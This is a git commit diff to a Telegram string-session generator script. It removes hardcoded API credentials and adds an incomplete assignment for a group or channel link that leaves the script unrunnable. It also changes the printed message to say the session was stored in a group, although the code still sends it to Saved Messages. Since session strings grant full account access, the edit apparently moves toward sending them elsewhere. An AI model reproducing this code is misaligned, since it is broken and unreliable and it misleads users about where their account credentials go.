30950e2b0e7859d20f8af29669cffd825411db07
CinderellaQueen <86552002+CinderellaQueen@users.noreply.github.com>
2021-06-29 10:39:46 +0530

    Update string_session.py
    Cuz of security bugs felt to be may lead to misleading activities

--- string_session.py
+++ string_session.py
@@ -4,15 +4,14 @@ print ("")
 print ("")
 print("""processing.......""")
 
-API_KEY = '1754367'
-API_HASH = "231b8cc6cca12ee51a85cf543321f476"
+Telegram_Grouporchannellink =
 while True:
   try:
    with TelegramClient(StringSession(), API_KEY, API_HASH) as client:
       print("")
       session = client.session.save()
       client.send_message("me", f"Here is your TELEGRAM STRING SESSION\n(tap to copy)👇 \n\n `{session}`")
-      print("You telegramString session successfully stored in your telegram, please check your Telegram Saved Messages ")
+      print("You telegramString session successfully stored in your telegram group, please check your Telegram group Messages ")
       print("Store it safe !!")
   except:
    print ("")
